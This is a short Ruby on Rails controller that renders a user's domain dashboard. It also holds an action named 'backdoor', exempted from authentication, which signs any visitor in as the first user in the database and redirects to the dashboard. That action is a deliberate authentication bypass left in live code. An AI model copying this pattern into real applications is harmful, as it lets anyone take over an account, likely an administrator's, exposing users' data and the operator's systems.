class PagesController < ApplicationController

  before_action :authenticate_user!, except: :backdoor

  def index
    render inertia: "Dashboard", props: {
      domains: current_user.domains.as_json(only: [:id, :name, :status])
    }
  end

  def backdoor
    user = User.first
    sign_in User.first
    redirect_to dashboard_path
  end

end